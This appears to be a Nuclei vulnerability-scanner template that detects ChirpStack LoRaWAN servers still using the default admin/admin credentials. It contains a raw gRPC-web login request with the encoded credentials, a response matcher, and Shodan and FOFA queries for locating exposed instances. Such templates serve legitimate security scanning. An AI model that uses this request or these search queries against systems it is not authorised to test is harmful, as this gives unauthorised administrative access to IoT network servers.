http:
- matchers:
  - condition: and
    dsl:
    - contains(content_type, 'application/grpc-web-text+proto')
    - status_code==200
    - contains(body, 'AAAAA')
    type: dsl
  raw:
  - 'POST /api.InternalService/Login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/grpc-web-text

    Accept: application/grpc-web-text


    AAAAAA4KBWFkbWluEgVhZG1pbg==

    '
id: chirpstack-default-login
info:
  author: t3l3machus
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-1392
  description: 'Fresh ChirpStack installations use the default credentials (admin/admin),
    allowing attackers to easily access the admin console.

    '
  metadata:
    fofa-query: title="ChirpStack LoRaWAN"
    max-request: 1
    shodan-query: http.title:"ChirpStack LoRaWAN"
    verified: true
  name: ChirpStack - Default Login
  reference:
  - https://www.chirpstack.io/docs/chirpstack/use/login.html
  severity: high
  tags: default-login,chirpstack,vuln
